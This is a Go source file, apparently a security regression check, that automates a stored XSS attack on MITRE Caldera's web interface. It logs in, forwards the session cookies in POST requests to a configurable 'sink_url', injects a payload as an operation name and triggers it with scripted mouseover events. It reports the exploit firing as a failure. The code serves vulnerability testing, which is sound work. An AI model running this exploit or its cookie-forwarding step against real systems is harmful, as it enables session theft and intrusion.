/*
Copyright © 2022-present, Meta Platforms, Inc. and affiliates

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

package cmd

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"math"
	"net/http"
	"os"

	"github.com/chromedp/cdproto/emulation"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/cdproto/runtime"
	"github.com/chromedp/chromedp"
	"github.com/fatih/color"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"github.com/spf13/viper"
)

var (
	// StoredXSSDosCmd runs the XSS vulnerability found after DEF CON 30.
	StoredXSSDosCmd = &cobra.Command{
		Use:   "StoredXSSDos",
		Short: "Stored XSS found in addition to the previously reported one",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Println(color.YellowString(
				"Introducing stored XSS vulnerability #2, please wait..."))

			caldera.URL = viper.GetString("login_url")
			caldera.RepoPath = viper.GetString("repo_path")
			caldera.Creds, err = GetRedCreds(caldera.RepoPath)
			if err != nil {
				log.WithError(err).Errorf(
					"failed to get Caldera credentials: %v", err)
				os.Exit(1)
			}

			caldera.Driver.Headless = viper.GetBool("headless")
			driver, cancels, err := setupChrome(caldera)
			if err != nil {
				log.WithError(err).Error("failed to setup Chrome")
				os.Exit(1)
			}

			defer cancelAll(cancels)

			caldera.Driver = driver

			caldera, err = Login(caldera)
			if err != nil {
				log.WithError(err).Error("failed to login to caldera")
				os.Exit(1)
			}

			caldera.Payload = viper.GetString("payload")

			if err = storedXSSDosVuln(caldera.Payload); err != nil {
				log.WithError(err).WithFields(log.Fields{
					"Payload": caldera.Payload,
				}).Error(color.RedString(err.Error()))
			}
		},
	}
	storedXSSDosSuccess bool
	introPayload        bool
)

func init() {
	rootCmd.AddCommand(StoredXSSDosCmd)
	storedXSSDosSuccess = false
	introPayload = false
}

// Payload is used to represent the POST
// body associated with the source for the attack.
type Payload struct {
	Name               string `json:"name"`
	AutoClose          bool   `json:"auto_close"`
	State              string `json:"state"`
	Autonomous         int    `json:"autonomous"`
	UseLearningParsers bool   `json:"use_learning_parsers"`
	Obfuscator         string `json:"obfuscator"`
	Jitter             string `json:"jitter"`
	Visibility         string `json:"visibility"`
}

func storedXSSDosVuln(payload string) error {
	var buf []byte
	var res *runtime.RemoteObject

	data := Payload{
		Name:               payload,
		AutoClose:          false,
		State:              "running",
		Autonomous:         1,
		UseLearningParsers: true,
		Obfuscator:         "plain-text",
		Jitter:             "2/8",
		Visibility:         "51",
	}
	sinkURL := viper.GetString("sink_url")

	if err := chromedp.Run(caldera.Driver.Context,
		chromedp.ActionFunc(func(ctx context.Context) error {
			cookies, err := network.GetCookies().Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to retrieve cookies")
				return err
			}
			for _, cookie := range cookies {
				payloadBytes, err := json.Marshal(data)
				if err != nil {
					log.WithError(err).Error("failed to marshal payload")
					return err
				}
				body := bytes.NewReader(payloadBytes)

				req, err := http.NewRequest("POST", sinkURL, body)
				if err != nil {
					log.WithError(err).Error("failed to create request")
					return err
				}
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Cookie", fmt.Sprintf("%s=%s", cookie.Name, cookie.Value))
				req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36")

				resp, err := http.DefaultClient.Do(req)
				if err != nil {
					log.WithError(err).Error("failed to submit request")
					return err
				}
				defer resp.Body.Close()

			}

			return nil

		})); err != nil {
		log.WithError(err).Error("failed to retrieve cookie")
		return err
	}

	// Selectors for chromeDP
	pageSelector := "#nav-menu > ul:nth-child(2) > li:nth-child(4) > a"
	createOPSelector := "#select-operation > div:nth-child(3) > button"
	opNameSelector := "#op-name"
	startSelector := "#operationsPage > div > div.modal.is-active > div.modal-card > footer > nav > div.level-right > div > button"
	debriefSelector := "#nav-menu > ul:nth-child(4) > li:nth-child(4) > a"
	operationSelector := "#tab-debrief > div > div:nth-child(3) > div.columns.mb-6 > div.column.is-3 > form > div > div > div > select > option"
	dropdownSelector := "#debrief-graph > div.is-flex.graph-controls.m-2 > div > select"
	triggerVulnJS := "nodes = document.querySelectorAll('[id^=node]'); nodes.forEach((x, i) => x.dispatchEvent(new MouseEvent('mouseover', {'bubbles': true})));"

	imagePath := viper.GetString("image_path")

	// listen network event
	listenForNetworkEvent(caldera.Driver.Context)

	// handle payload that use alerts, prompts, etc.
	chromedp.ListenTarget(caldera.Driver.Context, func(ev interface{}) {
		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
			go func() {
				err := chromedp.Run(caldera.Driver.Context,
					page.HandleJavaScriptDialog(true))

				// Account for initial payload introduction
				if !introPayload {
					introPayload = true
				} else {
					// If we have gotten here, the exploit succeeded.
					storedXSSDosSuccess = true
				}

				if err != nil {
					panic(err)
				}
			}()
		}
	})
	if err := chromedp.Run(caldera.Driver.Context,
		network.Enable(),
		chromedp.Click(pageSelector),
		chromedp.Sleep(Wait(1000)),
		chromedp.Click(createOPSelector),
		chromedp.SendKeys(opNameSelector, payload),
		chromedp.Click(startSelector),
		chromedp.Sleep(Wait(1000)),
		chromedp.Click(debriefSelector),
		chromedp.Sleep(Wait(1000)),
		chromedp.Click(operationSelector),
		chromedp.Sleep(Wait(1000)),
		chromedp.SendKeys(dropdownSelector, "Tactic"),
		chromedp.Sleep(Wait(1000)),
		chromedp.Evaluate(triggerVulnJS, &res),
		chromedp.Sleep(Wait(1000)),
		chromedp.ActionFunc(func(ctx context.Context) error {

			_, _, contentSize, _, _, _, err := page.GetLayoutMetrics().Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to get layout metrics")
				return err
			}

			width, height := int64(math.Ceil(contentSize.Width)),
				int64(math.Ceil(contentSize.Height))

			// force viewport emulation
			err = emulation.SetDeviceMetricsOverride(width, height, 1, false).
				WithScreenOrientation(&emulation.ScreenOrientation{
					Type:  emulation.OrientationTypePortraitPrimary,
					Angle: 0,
				}).Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to override device metrics")
				return err
			}

			// capture screenshot
			buf, err = page.CaptureScreenshot().
				WithQuality(100).
				WithClip(&page.Viewport{
					X:      contentSize.X,
					Y:      contentSize.Y,
					Width:  contentSize.Width,
					Height: contentSize.Height,
					Scale:  2,
				}).Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to take screenshot")
				return err
			}
			return nil
		})); err != nil {
		log.WithError(err).WithFields(log.Fields{
			"Payload": payload,
		}).Error("unexpected error while introducing the exploit")
		return err
	}

	if err := os.WriteFile(imagePath+"2.png", buf, 0644); err != nil {
		log.WithError(err).Error("failed to write screenshot to disk")
	}

	if storedXSSDosSuccess {
		errMsg := "failure: Stored XSS Dos ran successfully"
		return errors.New(errMsg)
	}

	log.WithFields(log.Fields{
		"Payload": payload,
	}).Info(color.GreenString("Success: Stored XSS Dos failed to run"))

	return nil
}
